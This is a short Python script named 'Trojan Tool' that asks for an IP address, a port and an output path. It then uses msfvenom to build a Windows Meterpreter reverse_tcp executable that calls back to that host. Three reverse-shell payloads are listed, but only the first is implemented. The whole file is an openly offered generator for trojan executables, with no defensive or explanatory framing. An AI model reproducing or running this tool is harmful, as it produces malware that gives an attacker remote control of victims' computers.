#!/usr/bin/env python

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet TROJAN")

print("""

Welcome Trojan Tool

""")

ip = input("Local or External Ip Enter : ")

port = input("Port Enter : ")

print("""

1) windows/meterpreter/reverse_tcp
2) windows/meterpreter/reverse_http
3) windows/meterpreter/reverse_https

""")

payload = input("Payload Number Enter : ")

storage_place = input("Storage Place Enter : ")

if payload == "1":
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + port + " -f exe -o" + storage_place)

